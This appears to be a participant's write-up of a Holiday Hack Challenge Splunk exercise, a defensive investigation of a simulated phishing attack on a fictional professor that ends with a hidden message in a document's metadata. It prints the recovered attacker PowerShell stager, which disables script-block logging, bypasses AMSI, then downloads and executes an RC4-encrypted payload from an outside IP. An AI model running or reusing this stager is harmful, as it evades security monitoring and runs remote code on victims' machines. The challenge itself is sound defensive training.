# 6) Splunk
## Prompt 1
Access https://splunk.elfu.org/ as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas.

## Prompt 2
The Search for Holiday Cheer Challenge
1. Your goal is to answer the Challenge Question. You will include the answer to this question in your HHC write-up!
1. You do not need to answer the training questions. You may simply search through the Elf U SOC data to find the answer to the final question on your own.
1. If you need some guidance, answer the training questions! Each one will help you get closer to the answering the Challenge Question.
1. Characters in the SOC Secure Chat are there to help you. If you see a blinking red dot  next to a character, click on them and read the chat history to learn what they have to teach you! And don't forget to scroll up in the chat history!
1. To search the SOC data, just click the Search link in the navigation bar in the upper left hand corner of the page.
1. This challenge is best enjoyed on a laptop or desktop computer with screen width of 1600 pixels or more.
1. WARNING This is a defensive challenge. Do not attack this system, web application, or back-end APIs. Thank you!

# Solve Process
1. I don't know Splunk, so let's learn by following the training questions.
1. Question 1: What is the short host name of Professor Banas' computer?
    1. For the first question, one of the chat logs mentions that a system has beaconing (on the #ELFU SOC sub-chat), and that system's name is 'sweetums'. Alice mentions that's Professor Banas' system... bingo!
1. Question 2: 	What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\temp\report.pdf)
    1. Returning to Alice Bluebird, we see that we have 18 new messages.
    1. Following the hint to search for the professor's name, we find an unusual email from a student to the professor: please decrypt this zip file and hit enable content on Word, implying that the professor was phished by one of his students. Also, reading the professor's reply suggests that the script created a copy of another student's file even to the exact error. The word document launched a powershell script that ran (with some additional formatting to fix the mess):
    ```powershell
    IF($PSVerSioNTaBLe.PSVERsIOn.MAJor -gE 3)
    {
        $GPF=[Ref].ASsEMBly.GETTyPE('System.Management.Automation.Utils')."GEtFiE`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');
        IF($GPF)
        {
            $GPC=$GPF.GeTVAluE($nUlL);
            If($GPC['ScriptB'+'lockLogging'])
            {
                $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
                $GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0
            }
            $val=[COLlEcTioNs.GEneRiC.DICTIoNAry[StrING,SySTEm.ObjecT]]::NeW();
            $vAl.AdD('EnableScriptB'+'lockLogging',0);
            $vaL.ADd('EnableScriptBlockInvocationLogging',0);
            $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$VAl
        }
        ElSE
        {
            [SCrIPTBlOCK]."GEtFIe`lD"('signatures','N'+'onPublic,Static').SETVALUe($NUll,(NEW-OBjEct CollEcTions.GEnerIC.HashSeT[sTrING]))
        }
        [REf].ASSEMBlY.GETTYPe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GETFielD('amsiInitFailed','NonPublic,Static').SEtValUe($NUlL,$True)};
    };
    [SySteM.NeT.SERvicEPoInTMaNaGer]::EXPecT100CONtInUe=0;
    $wc=NEw-ObjECT SysTEM.NeT.WeBCLiENT;
    $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
    $wC.HEADErS.ADd('User-Agent',$u);
    $Wc.ProXy=[SySTeM.Net.WeBREQuEST]::DEFaULTWebProXy;
    $WC.PRoXy.CREDenTIAls = [SySTEm.NET.CRedeNTiAlCAcHe]::DeFaulTNeTwORkCREDenTiALS;
    $Script:Proxy = $wc.Proxy;
    $K=[SySTEM.Text.EncOdING]::ASCII.GeTBYteS('zd!Pmw3J/qnuWoHX~=g.{>p,GE]:|#MR');
    $R={
        $D,$K=$ARGs;
        $S=0..255;
        0..255 | %{
            $J=($J+$S[$_]+$K[$_%$K.COUnt])%256;
            $S[$_],$S[$J]=$S[$J],$S[$_]
        };
        
        $D | %{
            $I=($I+1)%256;
            $H=($H+$S[$I])%256;
            $S[$I],$S[$H]=$S[$H],$S[$I];
            $_-BXoR$S[($S[$I]+$S[$H])%256]
        }
    };
    $ser='http://144.202.46.214:8080';
    $t='/admin/get.php';
    $WC.HEADErs.Add("Cookie","session=reT9XQAl0EMJnxukEZy/7MS70X4=");
    $DATa=$WC.DownlOADDAtA($sEr+$T);
    $Iv=$DatA[0..3];
    $DatA=$dATa[4..$DatA.lENGtH];
    -JOIN[ChaR[]](& $R $DatA ($IV+$K))|IEX
    ```

    index=main "from\": \"Carl Banas" body*

    --->


    from: Carl Banas <Carl.Banas@faculty.elfu.org>
    to: Bradly Buttercups <Bradly.Buttercups@eIfu.org>
    subject: RE: Holiday Cheer Assignment Submission
    Bradly,
    
    I opened your assignment (which was not easy, by the way) and it seems you have not only not included an image per the instructions, but your assignment is identical to another student's assignment.  This means your grade will be 0/100.

    -----Original Message-----
    From: Bradly Buttercups <Bradly.Buttercups@eIfu.org> 
    Sent: Sunday, August 25, 2019 9:18 AM
    To: Carl Banas <Carl.Banas@faculty.elfu.org>
    Subject: Holiday Cheer Assignment Submission

    Professor Banas, I have completed my assignment. Please open the attached zip file with password 123456789 and then open the word document to view it. You will have to click \"Enable Editing\" then \"Enable Content\" to see it. This was a fun assignment. I hope you like it!  --Bradly Buttercups

        ---> /home/ubuntu/archive/6/0/e/6/0/60e608b8852a18cb3a57e16732f3f19fa87793bb


    index=main message -> powershell!

    ```bash
    for i in "/home/ubuntu/archive/7/f/6/3/a/7f63ace9873ce7326199e464adfdaad76a4c4e16" "/home/ubuntu/archive/9/b/b/3/d/9bb3d1b233ee039315fd36527e0b565e7d4b778f" "/home/ubuntu/archive/c/6/e/1/7/c6e175f5b8048c771b3a3fac5f3295d2032524af" "/home/ubuntu/archive/b/e/7/b/9/be7b9b92a7acd38d39e86f56e89ef189f9d8ac2d" "/home/ubuntu/archive/1/e/a/4/4/1ea44e753bd217e0edae781e8b5b5c39577c582f" "/home/ubuntu/archive/e/e/b/4/0/eeb40799bae524d10d8df2d65e5174980c7a9a91" "/home/ubuntu/archive/1/8/f/3/3/18f3376a0ce18b348c6d0a4ba9ec35cde2cab300" "/home/ubuntu/archive/f/2/a/8/0/f2a801de2e254e15840460f4a53e568f6622c48b" "/home/ubuntu/archive/1/0/7/4/0/1074061aa9d9649d294494bb0ae40217b9c7a2d9" "/home/ubuntu/archive/8/6/c/4/d/86c4d8a2f37c6b4709273561700640a6566491b1" "/home/ubuntu/archive/a/2/b/b/1/a2bb14afe8161ee9bd4a6ea10ef5a9281e42cd09" "/home/ubuntu/archive/4/0/d/c/1/40dc1e00e2663cb33f8c296cdb0cd52fa07a87b6" "/home/ubuntu/archive/f/5/c/b/a/f5cba8a650d6ada98d170f1b22098d93b8ff8879" "/home/ubuntu/archive/0/2/b/6/7/02b67cad55d2684115a7de04d0458a3af46b12c6" "/home/ubuntu/archive/1/7/6/1/2/1761214092f5c0e375ab3bc58a8687134b7f2582" "/home/ubuntu/archive/b/7/7/0/f/b770f3a79423882bdae4240e995c0885770022ef" "/home/ubuntu/archive/9/d/7/a/b/9d7abf0ee4effcecad80c8bbfb276079a05b4342" "/home/ubuntu/archive/e/9/2/1/1/e9211c706be234c20d3c02123d85fea50ae638fd" "/home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4" "/home/ubuntu/archive/7/f/6/3/a/7f63ace9873ce7326199e464adfdaad76a4c4e16" "/home/ubuntu/archive/9/b/b/3/d/9bb3d1b233ee039315fd36527e0b565e7d4b778f" "/home/ubuntu/archive/c/6/e/1/7/c6e175f5b8048c771b3a3fac5f3295d2032524af"; do
        wget https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts$i
    done
    ```

    We see that the cookie "reT9XQAl0EMJnxukEZy/7MS70X4=" shows up in 7 logs, which doesn't give us much. Let's look at 144.202.46.214 instead. We see ~700 logs from that which may help us.
    We also see "http://144.202.46.214:8080:8080/news.php	60	37.736%	
    http://144.202.46.214:8080:8080/login/process.php	56	35.22%	
    http://144.202.46.214:8080:8080/admin/get.php	43	27.044%	
    " according to the URL view from Splunk (yeah idk what I'm doing)

    683b48f1ebc236cf9e367e1e3a08bcc0 -> download event md5
    earliest="08/23/2019:15:07:10" latest="08/23/2019:15:07:12"

    Let's search for docm.
    This gives us a temporary folder that the file was opened from.
    Let's search for docx instead
    png returns interesting results & jpeg too
    .doc returns "C:\Users\cbanas\Documents\assignment\19th Century Holiday Cheer Assignment.doc" which is wrong
    
    Let's look for "C:\\Users\\cbanas" instead ...
    aha!
    C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt
    Looks sensitive to me!
    and that's the answer.

    Then Alice disses us and tells us we could've just searched "index=main santa" instead. :D

1. For the Fully Qualified Domain Name, let's look for "144.202.46.214" and DNS.
    We can do this by looking at "144.202.46.214" and DestinationHostname:
    144.202.46.214.vultr.com

    The suggested way was "sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3"


1. For this we already know! It's the docm file :D
    19th Century Holiday Cheer Assignment.docm

    Alice suggested a lot of useful stuff, but we hit it all at step 1 haha.


1. Let's look for "Carl.Banas@faculty.elfu.org"
    Turning on the syntax highlighter on one of the emails, let's look for results.workers.iocextract.email
    ```splunk
    Carl.Banas@faculty.elfu.org | fields "results{}.workers.iocextract.email{}"
    ```
    Bah close enough. Select all on the page, copy in to VS Code, and run the regex \S*@\S* to extract all emails on the page. Then sort and reduce & remove the machine ones for the following list:
    ```
    bradly.buttercups@eifu.org
    brownie.snowtrifle@students.elfu.org
    bushy.evergren@students.elfu.org
    carol.greenballs@students.elfu.org
    cherry.brandyfluff@students.elfu.org
    clove.fruitsparkles@students.elfu.org
    cupcake.silverlog@students.elfu.org
    holly.evergreen@students.elfu.org
    merry.fairybubbles@students.elfu.org
    minty.candycane@students.elfu.org
    partridge.sugartree@students.elfu.org
    pepper.minstix@students.elfu.org
    plum.sparklepie@students.elfu.org
    robin.wintercrystals@students.elfu.org
    shinny.upatree@students.elfu.org
    sixpence.snowcane@students.elfu.org
    sparkle.redberry@students.elfu.org
    sugerplum.mary@students.elfu.org
    turtledove.fairytree@students.elfu.org
    wunorse.openslae@students.elfu.org
    yule.toffeetoes@students.elfu.org
    ```
    Which is 21 different emails.
1. For the password the email said "123456789"
1. For the email it was Bradly.Buttercups@eIfu.org

And for the final challenge, we download the files associated with that attack... and cat them.
1. The docm is sanitized with the message:
    ```
    In the real world, This would have been a wonderful artifact for you to investigate, but it had malware in it of course so it's not posted here. Fear not! The core.xml file that was a component of this original macro-enabled Word doc is still in this File Archive thanks to stoQ. Find it and you will be a happy elf :-)
    Cleaned for your safety. Happy Holidays!

    In the real world, This would have been a wonderful artifact for you to investigate, but it had malware in it of course so it's not posted here. Fear not! The core.xml file that was a component of this original macro-enabled Word doc is still in this File Archive thanks to stoQ. Find it and you will be a happy elf :-)
    ```
    Which tells us to look at the core.xml file (haha, we wasted so much time on this, we even read this at the start)
    And in the core.xml file it says:
    ```xml
    <cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <dc:title>Holiday Cheer Assignment</dc:title>
    <dc:subject>19th Century Cheer</dc:subject>
    <dc:creator>Bradly Buttercups</dc:creator>
    <cp:keywords></cp:keywords>
    <dc:description>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</dc:description>
    <cp:lastModifiedBy>Tim Edwards</cp:lastModifiedBy>
    <cp:revision>4</cp:revision>
    <dcterms:created xsi:type="dcterms:W3CDTF">2019-11-19T14:54:00Z</dcterms:created>
    <dcterms:modified xsi:type="dcterms:W3CDTF">2019-11-19T17:50:00Z</dcterms:modified>
    <cp:category></cp:category>
    </cp:coreProperties>
    ```
    Which gives us the message "Kent you are so unfair. And we were going to make you the king of the Winter Carnival."